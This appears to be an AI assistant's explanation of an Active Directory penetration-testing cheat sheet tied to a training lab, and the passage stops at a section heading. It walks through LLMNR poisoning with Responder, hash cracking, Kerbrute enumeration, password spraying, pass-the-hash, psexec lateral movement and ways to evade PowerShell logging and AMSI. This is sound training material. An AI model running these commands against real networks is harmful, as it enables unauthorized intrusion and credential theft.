Of course\! Here is a detailed breakdown of each command, explaining its purpose, use case, and options.

# Active Directory Penetration Testing Commands

-----

## Recon

This phase involves gathering information about the target from publicly available sources without directly interacting with the target's network.

### `viewdns.info`

  * **What it does:** This is not a command-line tool but a **website** that provides a suite of network tools for DNS lookups, IP address information, and other reconnaissance tasks.
  * **When to use it:** During the initial, passive reconnaissance phase to gather information like IP history, DNS records (MX, A, NS), and reverse IP lookups for a target domain. This helps map out the public-facing infrastructure.
  * **Options:** The website offers various tools, such as DNS Report, IP History, Reverse IP Lookup, and Port Scanner.

-----

### `nslookup ns1.inlanefreight.com`

  * **What it does:** A command-line tool used to query the Domain Name System (DNS) to obtain domain name or IP address mapping, or for any other specific DNS record. This specific command looks up the IP address of the nameserver `ns1.inlanefreight.com`.
  * **When to use it:** To find IP addresses of servers, identify name servers, or query for specific record types (e.g., MX for mail servers) to understand the target's network architecture.
  * **Options:**
      * `ns1.inlanefreight.com`: The hostname you want to look up.
      * You can also specify a DNS server to query against (e.g., `nslookup example.com 8.8.8.8`).
      * Inside the interactive `nslookup` shell, you can use `set type=mx` to query for mail exchange records.

-----

### `linkedin2username`

  * **What it does:** A script that uses LinkedIn to generate a list of potential usernames based on employee names found on a company's page. It creates permutations based on common username formats (e.g., `f.last`, `flast`, `first.last`).
  * **When to use it:** In the reconnaissance phase to build a list of potential usernames for later use in password spraying, user enumeration, or phishing attacks.
  * **Options:** This tool typically requires an input file of names and an output file path, with flags to specify the username format.

-----

### `filetype:pdf inurl:inlanefreight.com`

  * **What it does:** This is a **Google Dork**, a search query that uses advanced Google operators to find specific information. This query finds all PDF files indexed by Google that are hosted on the `inlanefreight.com` domain.
  * **When to use it:** To find potentially sensitive documents, metadata, internal paths, software versions, or employee names that have been accidentally exposed to the public.
  * **Options:**
      * `filetype:pdf`: Restricts the search to PDF files. You can use other types like `doc`, `xls`, `txt`.
      * `inurl:inlanefreight.com`: Restricts the search to URLs containing "inlanefreight.com". Other useful operators include `site:`, `intext:`, and `intitle:`.

-----

### `intext:"@inlanefreight.com" inurl:inlanefreight.com`

  * **What it does:** Another Google Dork that searches for the exact text "@inlanefreight.com" within the content of pages on the `inlanefreight.com` domain.
  * **When to use it:** To find email addresses, which can be used to build a list of usernames for password spraying or phishing campaigns.
  * **Options:**
      * `intext:`: Searches for text within the body of a webpage.
      * `inurl:`: Searches for text within the URL.

-----

### `sudo python3 dehashed.py -q inlanefreight.local -p`

  * **What it does:** Uses a script to query the Dehashed service, a leaked credential search engine. This command searches for any breaches associated with the `inlanefreight.local` domain and attempts to parse the results for passwords.
  * **When to use it:** To check if any credentials for the target domain have been exposed in public data breaches. This can provide valid username/password combinations.
  * **Options:**
      * `sudo`: Executes the command with superuser privileges.
      * `python3 dehashed.py`: Runs the Dehashed python script.
      * `-q inlanefreight.local`: Specifies the query (the domain to search for).
      * `-p`: Attempts to parse and display passwords from the breached data.

-----

-----

## Initial Enumeration

This phase involves actively scanning the target network to identify live hosts, open ports, and running services.

### `sudo -E wireshark`

  * **What it does:** Launches Wireshark, a graphical network protocol analyzer, with superuser privileges.
  * **When to use it:** To capture and inspect network traffic in real-time. This is useful for understanding network protocols, identifying hosts, and finding credentials or other sensitive information sent in clear text.
  * **Options:**
      * `sudo`: Runs Wireshark as root, which is necessary to capture from network interfaces.
      * `-E`: Preserves the existing environment variables.

-----

### `sudo tcpdump -i ens224`

  * **What it does:** A command-line packet analyzer. This command captures all traffic on the `ens224` network interface and displays it in the terminal.
  * **When to use it:** When you need a lightweight, command-line tool for network traffic capture, especially on remote systems via SSH where a GUI is unavailable. It's great for quick analysis or saving traffic to a file for later inspection in Wireshark.
  * **Options:**
      * `sudo`: Required to access the network interface in promiscuous mode.
      * `-i ens224`: Specifies the interface to listen on.
      * Other common options: `-w output.pcap` (write to a file), `host 1.2.3.4` (filter for a specific host), `port 80` (filter for a specific port).

-----

### `sudo responder -I ens224 -A`

  * **What it does:** Starts the Responder tool, a Link-Local Multicast Name Resolution (LLMNR), NBT-NS, and mDNS poisoner. It listens for name resolution requests on the local network and responds with its own IP, tricking clients into sending their NTLMv2 password hashes to it.
  * **When to use it:** In an internal network penetration test to capture password hashes from Windows clients. This is often one of the first steps to gain an initial foothold.
  * **Options:**
      * `sudo`: Required to bind to privileged ports.
      * `-I ens224`: Specifies the network interface to use.
      * `-A`: Analyze mode. This is an aggressive mode that responds to all requests, even for hosts not in the NBT-NS cache, which can be noisy but effective.

-----

### `fping -asgq 172.16.5.0/23`

  * **What it does:** A tool to send ICMP echo probes to network hosts, similar to `ping`, but much more efficient for scanning multiple hosts. This command scans the `172.16.5.0/23` subnet to find live hosts.
  * **When to use it:** For initial host discovery. It's a very fast way to identify which IP addresses are active on a subnet before running a more detailed port scan.
  * **Options:**
      * `-a`: Show systems that are alive.
      * `-s`: Print final statistics.
      * `-g`: Generate a target list from a CIDR range (`172.16.5.0/23`).
      * `-q`: Quiet mode, doesn't show per-host results, only a summary.

-----

### `sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum`

  * **What it does:** Runs an Nmap scan with aggressive options against a list of hosts provided in a file.
  * **When to use it:** After discovering live hosts, use this to perform in-depth enumeration: identify open ports, running services, OS versions, and run default NSE scripts.
  * **Options:**
      * `sudo`: Often needed for certain scan types like SYN scans (`-sS`).
      * `-v`: Verbose output.
      * `-A`: Aggressive scan. Enables OS detection (`-O`), version scanning (`-sV`), script scanning (`-sC`), and traceroute (`--traceroute`).
      * `-iL hosts.txt`: Takes the list of target IPs from the file `hosts.txt`.
      * `-oN <filename>`: Outputs the scan results in normal format to the specified file.

-----

### `nmap -A 172.16.5.100`

  * **What it does:** Performs an aggressive Nmap scan against a single target IP (`172.16.5.100`).
  * **When to use it:** When you want to perform a quick but comprehensive scan of a single, interesting host you've identified.
  * **Options:**
      * `-A`: Same as above (enables OS detection, version scanning, script scanning, and traceroute).

-----

### `sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23`

  * **What it does:** Runs a very fast and aggressive Nmap scan against an entire subnet, treating all hosts as online, and saves the output in a greppable format.
  * **When to use it:** When you need to quickly scan a large subnet and don't want to wait for ping probes. This is useful in environments where ICMP is blocked. The output format is ideal for processing with other tools.
  * **Options:**
      * `-Pn`: No Ping. Skips the host discovery phase and scans every IP address in the target range.
      * `-T5`: Insane timing template. Makes the scan much faster but can be less accurate and more detectable.
      * `-oG <filename>`: Outputs in "Greppable" format, which is easy to parse with tools like `grep`, `awk`, or `cut`.

-----

### `sudo git clone https://github.com/ropnop/kerbrute.git` & `sudo make all`

  * **What it does:** These two commands first download the source code for the Kerbrute tool from GitHub and then compile it.
  * **When to use it:** When you need to install Kerbrute, a tool for enumerating and bruteforcing Active Directory accounts via the Kerberos protocol.
  * **Options:**
      * `git clone <url>`: Downloads a repository.
      * `make all`: Compiles the source code according to the instructions in its `Makefile`.

-----

### `echo <hash> | tr -d "[:space:]" > hash`

  * **What it does:** This command takes a hash string, removes all whitespace characters from it, and saves the cleaned hash to a file named `hash`.
  * **When to use it:** When you've copied a hash from a tool's output (like Responder) that might contain spaces or newlines, and you need to clean it up before feeding it into a cracking tool like Hashcat or John the Ripper.
  * **Options:**
      * `tr -d "[:space:]"`: `tr` is the translate utility. `-d` deletes characters, and `"[:space:]"` matches all whitespace.

-----

### Metasploit Port Scanner

```shell
use auxiliary/scanner/portscan/tcp
set rhosts 172.16.6.0/24
set PORTS 139,445
set threads 50
run
```

  * **What it does:** This sequence of commands within the Metasploit Framework (`msfconsole`) uses a built-in port scanner module to scan for open TCP ports 139 and 445 on the `172.16.6.0/24` subnet using 50 concurrent threads.
  * **When to use it:** When you are already working within Metasploit and need to perform a quick port scan for specific services (like SMB) without switching to another tool like Nmap.
  * **Options:**
      * `use auxiliary/scanner/portscan/tcp`: Loads the TCP port scanner module.
      * `set rhosts <range>`: Sets the remote hosts (targets) to scan.
      * `set PORTS <ports>`: Sets the ports to scan.
      * `set threads <number>`: Sets the number of concurrent threads for faster scanning.
      * `run`: Executes the module.

-----

### Kerbrute Setup & Execution

```shell
./kerbrute_linux_amd64
echo $PATH
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

  * **What it does:** This series of commands first tests the downloaded `kerbrute` binary, displays the system's `PATH` variable, moves the binary into a directory within the `PATH` to make it executable from anywhere, and finally runs it to enumerate valid usernames against a domain controller.
  * **When to use it:** When you have a list of potential usernames and want to confirm which ones are valid Active Directory accounts without causing account lockouts (Kerberos pre-authentication checks don't typically trigger "bad password" events).
  * **Options:**
      * `echo $PATH`: Displays the directories where the shell looks for executable commands.
      * `sudo mv ... /usr/local/bin/kerbrute`: Moves and renames the file to make the `kerbrute` command globally accessible.
      * `userenum`: The Kerbrute command for user enumeration.
      * `-d INLANEFREIGHT.LOCAL`: Specifies the target domain.
      * `--dc 172.16.5.5`: Specifies the IP of the Domain Controller.
      * `jsmith.txt`: The wordlist containing potential usernames to test.
      * `-o valid_ad_users`: Saves the output to the specified file.

-----

-----

## LLMNR/NBT-NS Poisoning

This section focuses on capturing credentials by exploiting legacy name resolution protocols common in Windows environments.

### `responder -h`

  * **What it does:** Displays the help menu for the Responder tool, showing all available commands and options.
  * **When to use it:** When you need a quick reminder of Responder's syntax or want to explore its less common features.
  * **Options:**
      * `-h` or `--help`: Shows the help message.

-----

### `sudo responder -I ens224`

  * **What it does:** Starts Responder on the `ens224` interface with its default settings. It will listen for LLMNR/NBT-NS requests, poison responses, and start various rogue servers (SMB, HTTP, etc.) to capture hashes.
  * **When to use it:** This is the standard command to run Responder for hash capturing on an internal network.
  * **Options:**
      * `-I ens224`: Specifies the network interface. You can add `-v` for verbose output.

-----

### `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`

  * **What it does:** Attempts to crack an NTLMv2 hash using Hashcat, a fast password cracking tool.
  * **When to use it:** After you have successfully captured a hash using Responder, you use this command to find the corresponding cleartext password by trying all the words in a wordlist.
  * **Options:**
      * `-m 5600`: Specifies the hash mode. `5600` is for NTLMv2.
      * `forend_ntlmv2`: The file containing the hash(es) to be cracked.
      * `/usr/share/wordlists/rockyou.txt`: The wordlist to use for the attack.

-----

### `Import-Module .\Inveigh.ps1` (Windows)

  * **What it does:** Loads the Inveigh PowerShell script into the current session, making its functions available. Inveigh is a PowerShell equivalent of Responder.
  * **When to use it:** When you are operating on a Windows machine and want to perform LLMNR/NBT-NS poisoning without dropping binaries on disk. It's a "living off the land" approach.
  * **Options:** N/A for this command.

-----

### `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` (Windows)

  * **What it does:** Starts the Inveigh tool to perform poisoning and hash capturing.
  * **When to use it:** After importing the module, this command launches the attack.
  * **Options:**
      * `-NBNS Y`: Enables NBT-NS poisoning (Y for Yes).
      * `-ConsoleOutput Y`: Displays captured hashes and events in the console.
      * `-FileOutput Y`: Saves captured information to files.

-----

### `.\Inveigh.exe` (Windows)

  * **What it does:** Runs the executable version of Inveigh.
  * **When to use it:** If you have the compiled `.exe` version of Inveigh, this is an alternative to using the PowerShell script. It might be less likely to be blocked by PowerShell execution policies.
  * **Options:** It accepts similar command-line arguments to the PowerShell version.

-----

### Disabling NetBIOS over TCP/IP (Windows)

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

  * **What it does:** This PowerShell script iterates through all network interfaces in the registry and sets the `NetbiosOptions` value to `2`, which disables NetBIOS over TCP/IP.
  * **When to use it:** This is a **defensive** command. An administrator would run this to mitigate LLMNR/NBT-NS poisoning attacks, as it prevents the machine from sending out these types of name resolution requests.
  * **Options:** N/A, the script logic is self-contained.

-----

-----

## Sighting In, Hunting For a User

This section covers techniques for enumerating domain information, users, and policies, often with null sessions or low-privileged accounts.

### `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`

  * **What it does:** Uses CrackMapExec (CME) to connect to the SMB service on the target. It authenticates with the provided credentials (`avazquez:Password123`) and, if successful, uses the `--pass-pol` module to dump the domain password policy.
  * **When to use it:** When you have a set of credentials and want to quickly verify them and learn about the password policy (e.g., minimum length, complexity requirements, lockout threshold) to inform future password attacks.
  * **Options:**
      * `smb`: The protocol to use.
      * `-u avazquez`: Username.
      * `-p Password123`: Password.
      * `--pass-pol`: Executes the password policy enumeration module.

-----

### `rpcclient -U "" -N 172.16.5.5` & `querydominfo`

  * **What it does:** The first command uses `rpcclient` to establish an anonymous (null session) connection to the target's RPC endpoint. The second command, `querydominfo`, is run inside the `rpcclient` interactive shell to retrieve basic domain information like Domain Name and SID.
  * **When to use it:** For initial unauthenticated enumeration of a domain controller. If null sessions are allowed, you can gather valuable domain information without any credentials.
  * **Options:**
      * `-U ""`: Specifies an empty username for a null session.
      * `-N`: Specifies no password.

-----

### `enum4linux -P 172.16.5.5`

  * **What it does:** A comprehensive enumeration tool that wraps Samba tools to query information from Windows and Samba systems.
  * **When to use it:** To perform broad, unauthenticated enumeration against a target. It can retrieve the password policy, user lists, group information, shares, and more.
  * **Options:**
      * `-P`: Get Password Policy information.
      * Other common options: `-U` (get userlist), `-S` (get sharelist), `-a` (do all simple enumeration).

-----

### `enum4linux-ng -P 172.16.5.5 -oA ilfreight`

  * **What it does:** Runs `enum4linux-ng` (a newer version of enum4linux) to get the password policy from the target and save the output in all available formats.
  * **When to use it:** Similar to `enum4linux`, but often provides more stable and detailed results. It's a great tool for initial information gathering.
  * **Options:**
      * `-P`: Get Password Policy information.
      * `-oA ilfreight`: Output in All formats with the base filename `ilfreight`.

-----

### `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`

  * **What it does:** Performs an anonymous LDAP query against the domain controller, searching the entire directory (`-s sub "*"`) for all objects. The output is then piped to `grep` to find the `pwdHistoryLength` attribute, which is part of the domain password policy.
  * **When to use it:** As a specific, targeted way to query LDAP for domain policy information without using a broad enumeration tool. This is useful if anonymous LDAP binds are permitted.
  * **Options:**
      * `-h 172.16.5.5`: The target host (LDAP server).
      * `-x`: Use simple authentication instead of SASL.
      * `-b "..."`: The search base (the root of the domain).
      * `grep -m 1 -B 10`: Finds the first match (`-m 1`) and shows 10 lines before it (`-B 10`).

-----

### `net use \\DC01\ipc$ "" /u:""` (Windows)

  * **What it does:** Attempts to establish a null session (anonymous login) to the IPC$ (Inter-Process Communication) share on the server `DC01`.
  * **When to use it:** To test if a target machine is vulnerable to null session enumeration. A successful connection (response: "The command completed successfully.") indicates that you can proceed with tools like `enum4linux` or other RPC queries.
  * **Options:**
      * `\\DC01\ipc$`: The target share.
      * `""`: An empty password.
      * `/u:""`: An empty username.

-----

### `net accounts` (Windows)

  * **What it does:** When run on a domain-joined machine, this command displays the current password and logon policies for the domain.
  * **When to use it:** After gaining access to any domain-joined machine, run this to quickly see the password policy (min/max password age, lockout threshold, etc.).
  * **Options:**
      * `/domain`: Can be used to explicitly query the domain policy if the machine is also part of a workgroup.

-----

### `import-module .\PowerView.ps1` & `Get-DomainPolicy` (Windows)

  * **What it does:** The first command loads PowerView, a powerful PowerShell tool for AD enumeration. The second command, `Get-DomainPolicy`, retrieves the default domain policy or the policy for a specified domain.
  * **When to use it:** This is a more comprehensive and modern way to get domain policy information from a Windows host compared to `net accounts`.
  * **Options:** `Get-DomainPolicy` can take a `-Domain` argument if you need to query a different domain.

-----

-----

## Username Enumeration

This section focuses on different methods to obtain a list of valid usernames from the domain.

### `enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

  * **What it does:** Runs `enum4linux` to get a list of users, then uses `grep` and `cut` to parse the output and extract just the usernames.
  * **When to use it:** A quick one-liner to get a clean list of usernames from `enum4linux` if it's able to enumerate them via RPC.
  * **Options:**
      * `cut -f2 -d"["`: Splits the line by the `[` delimiter and takes the second field.
      * `cut -f1 -d"]"`: Takes the result from the first cut and splits it by `]`, taking the first field.

-----

### `rpcclient -U "" -N 172.16.5.5` (then `enumdomusers` inside)

  * **What it does:** Establishes a null session with `rpcclient` and then uses the internal command `enumdomusers` to list all domain users.
  * **When to use it:** Another method for user enumeration that relies on an anonymous RPC (null session) connection.
  * **Options:** See the `rpcclient` explanation in the previous section.

-----

### `crackmapexec smb 172.16.5.5 --users`

  * **What it does:** Uses CME to enumerate domain users via the SMB protocol. This typically requires at least guest access or a valid user account, but can sometimes work with a null session.
  * **When to use it:** A very fast and reliable way to enumerate users if you have any level of access, or if null sessions are configured.
  * **Options:**
      * `--users`: The action to perform user enumeration. Can be combined with credentials (`-u user -p pass`).

-----

### `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "`

  * **What it does:** Performs an anonymous LDAP query for all objects of class "user" and then parses the output to extract only the `sAMAccountName` (the username).
  * **When to use it:** If anonymous LDAP binds are allowed, this is one of the most accurate ways to get a complete list of all users in the domain.
  * **Options:**
      * `"(&(objectclass=user))"`: The LDAP filter to find user objects.
      * `grep sAMAccountName:`: Filters for lines containing the username attribute.
      * `cut -f2 -d" "`: Cuts the line, using a space as the delimiter, and keeps the second field.

-----

### `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | awk '/VALID USERNAME/ {print $7}' | cut -d '@' -f 1 > valid_users.txt`

  * **What it does:** Uses Kerbrute with a username list (`jsmith.txt`) to test for valid users. The output is then parsed with `awk` and `cut` to extract only the username part (before the `@`) from the valid results and save it to a file.
  * **When to use it:** When you have a potential list of usernames and want to validate them safely via Kerberos pre-authentication. This is a great way to turn a potential list into a confirmed list.
  * **Options:**
      * `awk '/VALID USERNAME/ {print $7}'`: For lines containing "VALID USERNAME", it prints the 7th field (e.g., `username@domain.local`).
      * `cut -d '@' -f 1`: Splits the string by `@` and takes the first part (the username).

-----

-----

## Password Spraying

This technique involves trying a single, common password against many different user accounts to avoid account lockouts.

### `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

  * **What it does:** This is a bash loop that reads each username from `valid_users.txt`, attempts to authenticate against the RPC service with that username and the password "Welcome1", and prints output if the login is successful.
  * **When to use it:** A simple, manual way to perform a password spray using `rpcclient`. It's not very efficient but works without specialized tools. A successful login will return the user's SID (`...Authority...`). A failed login will produce an error.
  * **Options:**
      * `-U "$u%Welcome1"`: The format for `rpcclient` is `username%password`.
      * `-c "getusername;quit"`: Executes the `getusername` command upon successful login and then quits.

-----

### `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`

  * **What it does:** Uses Kerbrute's dedicated password spraying module to test the password "Welcome1" against all users in `valid_users.txt` via Kerberos.
  * **When to use it:** A much safer and more efficient way to password spray than using RPC or SMB, as it's less likely to be logged as conspicuously and is often faster.
  * **Options:**
      * `passwordspray`: The Kerbrute module for this attack.
      * `valid_users.txt`: The file containing the list of usernames.
      * `Welcome1`: The single password to try against all users.

-----

### `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`

  * **What it does:** Uses CrackMapExec to spray the password "Password123" against a list of users over SMB. The output is piped to `grep +` to filter for successful logins only.
  * **When to use it:** This is the most common and effective method for password spraying on an internal network. CME is highly optimized for this task.
  * **Options:**
      * `-u valid_users.txt`: Specifies a file containing usernames.
      * `-p Password123`: The password to spray.
      * `| grep +`: CME indicates a successful login with a green `(+)`. This command filters the output to show only those successes.

-----

### `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <HASH> | grep +`

  * **What it does:** This command performs a "pass-the-hash" attack across an entire subnet. It attempts to authenticate to every host in the `172.16.5.0/23` range using the local `administrator` account and its NTLM hash, instead of a password.
  * **When to use it:** When you have dumped a local administrator hash from one machine and want to see if that same account and password/hash is reused on other machines in the network (a common misconfiguration).
  * **Options:**
      * `--local-auth`: Tells CME to authenticate against local accounts, not domain accounts.
      * `-u administrator`: The local username to use.
      * `-H <HASH>`: The NTLM hash to use for authentication.

-----

## Deeper Down / Living Off the Land

This phase occurs after gaining initial access to a machine. It involves using built-in tools and scripts ("Living off the Land" or LOLBAS) to understand the local system and the wider domain environment without introducing potentially noisy external tools. The following are primarily Windows/PowerShell commands.

### `Get-MpComputerStatus`

* **What it does:** A PowerShell cmdlet that retrieves the status of the antivirus and antispyware software on the computer (specifically Windows Defender).
* **When to use it:** Immediately after gaining access to a Windows host to understand the state of its primary AV. You can check if it's running, if real-time protection is enabled, and when the definitions were last updated. This informs your decisions about which tools and techniques might get caught.
* **Options:** This cmdlet has no common parameters; it's typically run as is.

---

### `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`

* **What it does:** Retrieves the effective AppLocker policy on the local machine and expands the rule collections. AppLocker is an application whitelisting solution that can prevent unauthorized executables, scripts, and installers from running.
* **When to use it:** To understand what restrictions are in place for running programs and scripts. By analyzing the rules, you can find bypasses—for example, a writable directory from which you are allowed to execute scripts.
* **Options:**
    * `-Effective`: Gets the policy that is currently being enforced on the computer.

---

### `$ExecutionContext.SessionState.LanguageMode`

* **What it does:** This PowerShell variable reveals the language mode of the current session. The mode determines which elements of the PowerShell language are available.
* **When to use it:** To check for PowerShell Constrained Language Mode, a security feature that severely limits the available commands and functionality to prevent malicious activity. If it's not in `FullLanguage` mode, you'll need to find a bypass to run tools like PowerView or Mimikatz.
* **Options:** N/A, this is an intrinsic variable.

---

### `Find-LAPSDelegatedGroups`, `Find-AdmPwdExtendedRights`, `Get-LAPSComputers`

* **What it does:** These are PowerView functions related to LAPS (Local Administrator Password Solution).
    * `Find-LAPSDelegatedGroups`: Finds groups that have permission to view LAPS passwords.
    * `Find-AdmPwdExtendedRights`: Finds users/groups that have extended rights to view LAPS passwords on computer objects.
    * `Get-LAPSComputers`: Identifies computers in the domain that have LAPS enabled.
* **When to use it:** When you suspect LAPS is in use. If you can compromise a user or group with rights to read LAPS passwords, you can instantly gain local administrator access to many machines on the network.
* **Options:** These cmdlets are generally run without parameters to search the entire domain.

---

### `Get-Module`

* **What it does:** Lists all the PowerShell modules that have been imported into the current session or are available to be imported.
* **When to use it:** To see what tools and functionalities are readily available. For example, if the `ActiveDirectory` module is already loaded, you can immediately start using AD-related cmdlets.
* **Options:**
    * `-ListAvailable`: Shows all modules available on the system, not just those currently loaded.

---

### `Get-ChildItem Env: | ft key,value`

* **What it does:** Lists all the environment variables for the current session and formats them as a table.
* **When to use it:** To search for potentially sensitive information stored in environment variables, such as API keys, connection strings, or paths to interesting directories.
* **Options:**
    * `ft` is an alias for `Format-Table`.

---

### `powershell.exe -version 2`

* **What it does:** Starts a new PowerShell process that runs in PowerShell Version 2 mode.
* **When to use it:** As a bypass technique. PowerShell v2 lacks many of the modern security features like script block logging and AMSI (Antimalware Scan Interface). If a system has AppLocker or other protections that hinder your v5+ session, downgrading to v2 might allow your scripts to run undetected. This is only possible if the v2 engine is still installed.
* **Options:**
    * `-version 2`: Specifies the engine version to use.

---

### `netsh advfirewall show allprofiles`

* **What it does:** A built-in command-line tool to display the Windows Firewall configuration for all network profiles (Domain, Private, Public).
* **When to use it:** To understand the firewall rules on the local host. This helps determine which ports are open for inbound/outbound connections, which is crucial for planning lateral movement or data exfiltration.
* **Options:** N/A for this specific command.

---

### `sc query windefend`

* **What it does:** Uses the Service Control (`sc`) utility to query the status of the service with the short name `windefend` (Windows Defender).
* **When to use it:** A command-prompt alternative to `Get-MpComputerStatus` to quickly check if Windows Defender is running.
* **Options:**
    * `query`: The action to perform.
    * `windefend`: The name of the service to query.

---

### `qwinsta`

* **What it does:** Displays information about Remote Desktop Services sessions on a system. It shows who is logged on, both locally and remotely.
* **When to use it:** To see if other users, particularly administrators, are currently logged into the machine you have compromised. This can help you decide whether to attempt credential theft (as their credentials might be in memory) or if you should be stealthy to avoid being noticed.
* **Options:** N/A for this command.

---

### `arp -a`

* **What it does:** Displays the current ARP (Address Resolution Protocol) cache, which maps IP addresses to MAC addresses of other hosts on the local network segment.
* **When to use it:** For quick and stealthy host discovery on the local subnet. The ARP cache is populated by recent network traffic, so it gives you a list of nearby hosts without sending any new packets on the network.
* **Options:**
    * `-a`: Displays all current ARP entries.

---

### `route print`

* **What it does:** Displays the IP routing table for the local host.
* **When to use it:** To understand the network configuration of the compromised host. You can identify the default gateway, specific routes to other subnets, and potentially discover other networks the host is connected to (multihomed systems).
* **Options:** N/A for this command.

---

### `wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress`

* **What it does:** Uses Windows Management Instrumentation (WMI) to query for information about the Active Directory domain the computer is joined to.
* **When to use it:** An alternative to PowerShell or `nltest` for gathering basic domain information from the command line, such as the domain name and the address of a domain controller.
* **Options:** The properties `Caption`, `Description`, etc., specify which pieces of information to retrieve.

---

### `net group /domain`, `net user /domain <username>`, `net localgroup Administrators`

* **What it does:** These are fundamental `net` commands for AD enumeration.
    * `net group /domain`: Lists all groups in the domain.
    * `net user /domain <username>`: Shows detailed information about a specific domain user, including group memberships.
    * `net localgroup Administrators`: Lists the members of the local Administrators group on the current machine.
* **When to use it:** For basic, built-in enumeration of users and groups. Checking the local administrators group is crucial for identifying privilege escalation paths on the local machine.
* **Options:**
    * `/domain`: Specifies that the command should query the domain controller.

---

### `dsquery` commands

* **What they do:** `dsquery` is a powerful built-in command-line tool for making LDAP queries to Active Directory.
    * `dsquery user`: Finds users in the directory.
    * `dsquery computer`: Finds computers in the directory.
    * `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"`: A generic query that finds all objects within the specified Organizational Unit (OU) or container.
    * The longer `dsquery * -filter ...` commands are performing specific LDAP queries to find users with certain `userAccountControl` flags set (e.g., finding disabled accounts, accounts with service principal names, or accounts with `adminCount=1`, which indicates they are or were members of a privileged group).
* **When to use them:** When you need to perform very specific queries against Active Directory from the command line without using PowerShell. It's a great "living off the land" tool for targeted enumeration.
* **Options:**
    * `*`: A wildcard indicating to search for any type of object.
    * `-filter <LDAP_FILTER>`: Allows you to use standard LDAP query syntax for very specific searches.
    * `-attr <attributes>`: Specifies which attributes of the found objects to display.
    * `-limit <number>`: Limits the number of results returned.

---
---

## Credentialed Enumeration

Once you have valid credentials (even for a low-privileged user), you can perform much more detailed and accurate enumeration of the domain.

### CrackMapExec (Credentialed)

* **What it does:** These commands use CME with valid credentials to query domain information.
    * `--users`: Enumerates all domain users.
    * `--groups`: Enumerates all domain groups.
    * `--loggedon-users`: Enumerates which users are currently logged on to the target machines.
    * `--shares`: Enumerates all accessible SMB shares on the target.
    * `-M spider_plus --share 'Department Shares'`: Runs the `spider_plus` module to recursively list all files and folders on a specific share, looking for interesting keywords.
* **When to use it:** As a primary tool for authenticated enumeration from a Linux attack machine. It's extremely fast and efficient for querying users, groups, shares, and logged-on users across multiple hosts. The spidering module is excellent for finding sensitive files on network shares.
* **Options:**
    * `-u forend`: The username.
    * `-p Klmcargo2`: The password.
    * `-M <module>`: Executes a specific CME module.

---

### `smbmap`

* **What it does:** A tool specifically for enumerating SMB shares.
    * `smbmap -u ... -H 172.16.5.5`: Lists shares on the target host and your permissions on them (READ, WRITE).
    * `-R 'Department Shares' --dir-only`: Recursively lists only the directories within the specified share.
* **When to use it:** When you want to focus specifically on finding and mapping out SMB shares and permissions. It provides a clean, easy-to-read overview of what you can access.
* **Options:**
    * `-u <user>`: Username.
    * `-p <pass>`: Password.
    * `-d <domain>`: Domain.
    * `-H <host>`: Target host.
    * `-R <share>`: Perform a recursive listing on a share.

---

### `rpcclient` (Credentialed) & `psexec.py`/`wmiexec.py`

* **What it does:**
    * `rpcclient -U "user%pass" ...`: Connects to RPC with credentials. Inside, commands like `queryuser <RID>` or `enumdomusers` can be used to get detailed information.
    * `psexec.py <domain>/<user>:<pass>@<host>`: A script from the Impacket suite that gives you a semi-interactive shell on a remote system. It works by uploading and running a service executable. **Requires SMB (port 445) and admin rights on the target.**
    * `wmiexec.py ...`: Another Impacket script that provides a shell using WMI instead of creating a service. It can be stealthier and sometimes works when `psexec` is blocked. **Requires WMI (port 135 + dynamic ports) and admin rights on the target.**
* **When to use them:** `rpcclient` is for remote enumeration. `psexec.py` and `wmiexec.py` are for **lateral movement**—executing commands and gaining shell access on a remote machine where your user has local administrator privileges.
* **Options:** The syntax `domain/user:password@host` is standard for Impacket tools.

---

### `windapsearch.py`

* **What it does:** A Python script for enumerating Active Directory through LDAP queries.
    * `--da`: Searches for members of the Domain Admins group.
    * `-PU`: Searches for "Privileged Users" (members of various default administrative groups).
* **When to use it:** For performing targeted, authenticated LDAP queries from a Linux machine to quickly identify privileged users and groups.
* **Options:**
    * `--dc-ip <ip>`: The IP of the domain controller.
    * `-u <user>`: Username (can be in `user@domain` format).
    * `-p <pass>`: Password.

---

### `bloodhound-python`

* **What it does:** A Python-based data collector for BloodHound. It connects to the domain with specified credentials, enumerates users, groups, computers, sessions, GPOs, and ACLs, and saves the data as a set of JSON files.
* **When to use it:** This is a crucial step in a modern AD assessment. After getting any set of domain credentials, you run this ingestor to collect data. You then load the resulting JSON files into the BloodHound GUI to visually map out attack paths to high-value targets like Domain Admins.
* **Options:**
    * `-u <user>`: Username.
    * `-p <pass>`: Password.
    * `-ns <ip>`: The IP of a name server or domain controller.
    * `-d <domain>`: The target domain.
    * `-c all`: Specifies the collection method. `all` gathers everything possible (users, groups, trusts, sessions, ACLs, etc.).

---

### Windows Credentialed Enumeration (PowerShell)

